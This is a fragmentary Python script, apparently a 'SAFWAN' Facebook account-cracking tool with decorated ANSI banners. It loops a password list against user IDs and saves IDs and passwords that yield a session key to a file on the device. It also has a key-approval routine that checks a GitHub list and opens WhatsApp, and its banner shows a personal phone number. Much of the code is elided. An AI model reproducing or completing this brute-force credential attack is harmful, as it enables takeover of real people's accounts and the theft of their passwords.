...
🔥🔥🔥🔥🔥\033[1;97m SAFWAN is On fire🔥🔥🔥🔥🔥

\033[1;93m𝗧𝗛𝗜𝗦 𝗦𝗖𝗥𝗜𝗣𝗧 𝗜𝗦 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗕𝗬:😲✎ 
...
\033[1;96m ​🇪​​🇳​​🇯​​🇴​​🇾​ ​🇧​​🇷​​🇴
 ...
 \033[1;92m[+] 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  01568722961
 \033[1;92m[+] 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  SAFWAN
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				open('/sdcard/SAFU-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		pass
     #----------Approvel system by SAFWAN ISLAM
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/safwangaiming11/safu-random/blob/main/approval.txt').text
    if id in httpCaht:
      ...
      print('\33[1;93m----------------------------------------')
      print ('')
      input('ℙ𝕣𝕖𝕤𝕤 𝔼𝕟𝕥𝕖𝕣 𝕒𝕟𝕕 𝕊𝕖𝕟𝕕 𝕪𝕠??𝕣 𝕜𝕖𝕪 ②𝕠 𝕞𝕪 𝕎𝕙𝕒𝕥𝕤𝕒𝕡𝕡')
      tks = ('Hi%20Mr.%20👋%20Nisar%20Ulfat😊,%20Sir%20Please%20Approve%20My%20Key😒%20Just%20You%20Can%20Help%20Me😔%20%20My%20Key%20Is%20:%20👉%20'+id);os.system('am start https://wa.me/+880?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
